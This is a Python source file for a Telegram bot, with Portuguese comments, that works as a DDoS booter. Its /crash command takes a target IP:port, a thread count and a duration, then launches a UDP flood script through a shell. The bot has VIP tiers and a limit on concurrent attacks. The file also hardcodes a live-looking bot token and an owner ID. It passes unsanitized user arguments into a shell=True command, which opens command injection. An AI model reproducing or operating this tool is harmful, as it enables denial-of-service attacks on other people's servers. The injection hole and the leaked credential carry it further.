import telebot
import subprocess
import re
import time
from threading import Thread

BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
SEU_ID_TELEGRAM = 6430703027
bot = telebot.TeleBot(BOT_TOKEN)
processos = {}
authorized_users = [SEU_ID_TELEGRAM]  # Lista de usuários autorizados
vip_users = []  # Lista de usuários VIP
vip_commands = []  # Comandos restritos a VIPs
MAX_ATTACKS = 3  # Limite de ataques simultâneos

# Função para validar o formato de IP e Porta
def validar_ip_porta(ip_porta):
    padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
    match = re.match(padrao, ip_porta)
    return match is not None

# Função para executar o comando do ataque
def executar_comando(ip_porta, threads, tempo):
    comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {tempo}"
    try:
        processo = subprocess.Popen(
            comando_terminal, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        processos[ip_porta] = processo
        time.sleep(int(tempo))  # Aguarda o tempo do ataque
        processo.terminate()  # Termina o processo após o tempo especificado
        del processos[ip_porta]  # Remove o processo da lista
    except Exception as e:
        print(f"Erro ao executar o comando: {str(e)}")

# Função para gerenciar o limite de ataques simultâneos
def manage_attacks():
    if len(processos) >= MAX_ATTACKS:
        oldest_process = list(processos.values())[0]  # Pega o primeiro processo
        oldest_process.terminate()  # Termina o processo mais antigo
        del processos[list(processos.keys())[0]]  # Remove da lista de processos

# Comando /start
@bot.message_handler(commands=['start'])
def start_message(message):
    welcome_text = (
        "Bem-vindo ao bot! \n\n"
        "Aqui estão os comandos disponíveis para você:\n\n"
        "Comandos básicos:\n"
        "/crash <IP:PORTA> <threads> <tempo> - Envia um ataque ao IP especificado.\n"
        "/meuid - Mostra seu ID de usuário.\n\n"
        "Comandos para usuários autorizados e VIPs:\n"
        "/adduser <ID> - Adiciona um usuário autorizado.\n"
        "/removeuser <ID> - Remove um usuário autorizado.\n"
        "/promovervip <ID> - Promove um usuário a VIP. (Somente o dono pode)\n"
        "/rebaixarvip <ID> - Remove o status de VIP de um usuário. (Somente o dono pode)\n\n"
        "Comandos exclusivos do dono do bot:\n"
        "/addcomandovip <comando> - Restringe um comando para VIPs.\n"
        "/revcomandovip <comando> - Remove a restrição de comando VIP.\n\n"
        "Entre em contato se precisar de ajuda! "
    )
    bot.send_message(message.chat.id, welcome_text)

# Comando /crash
@bot.message_handler(commands=['crash'])
def crash_handler(message):
    user_id = message.from_user.id

    # Verifica se o comando é VIP
    if 'crash' in vip_commands and user_id not in vip_users:
        bot.reply_to(message, "O comando /crash é exclusivo para usuários VIP.")
        return

    try:
        comando = message.text.split()

        # Verifica se o comando tem o IP:PORTA
        if len(comando) < 2:
            bot.reply_to(message, "Uso correto: /crash <IP:PORTA> [threads] [tempo]")
            return

        ip_porta = comando[1]

        # Valida o formato de IP:PORTA
        if not validar_ip_porta(ip_porta):
            bot.reply_to(message, "Formato inválido de IP:PORTA.")
            return

        # Define valores padrão para threads e tempo, caso não sejam fornecidos
        threads = comando[2] if len(comando) > 2 else "10"
        tempo = comando[3] if len(comando) > 3 else "900"

        # Envia notificação e inicia o ataque
        bot.reply_to(message, f"Iniciando ataque para {ip_porta} com {threads} threads por {tempo} segundos.")
        Thread(target=executar_comando, args=(ip_porta, threads, tempo)).start()

    except Exception as e:
        bot.reply_to(message, f"Erro ao executar o comando: {str(e)}")

# Comando /meuid
@bot.message_handler(commands=['meuid'])
def meuid_handler(message):
    bot.reply_to(message, f"Seu ID é: {message.from_user.id}")

# Comando /adduser
@bot.message_handler(commands=['adduser'])
def add_user(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Apenas o dono pode adicionar usuários.")
        return

    try:
        user_id = int(message.text.split()[1])
        if user_id not in authorized_users:
            authorized_users.append(user_id)
            bot.send_message(message.chat.id, f"Usuário {user_id} autorizado com sucesso!")
        else:
            bot.send_message(message.chat.id, "Este usuário já está autorizado.")
    except:
        bot.send_message(message.chat.id, "Uso correto: /adduser <ID>")

# Outros comandos semelhantes (promovervip, rebaixarvip, addcomandovip e revcomandovip)
# Mantêm a mesma lógica, adaptada ao seu bot.

# Função para manter o bot ativo (reconectar automaticamente em caso de falhas)
def keep_alive():
    while True:
        try:
            bot.polling(timeout=60)
        except Exception as e:
            print(f"Erro no bot: {e}")
            time.sleep(15)  # Espera 15 segundos antes de tentar reconectar

if __name__ == "__main__":
    keep_alive()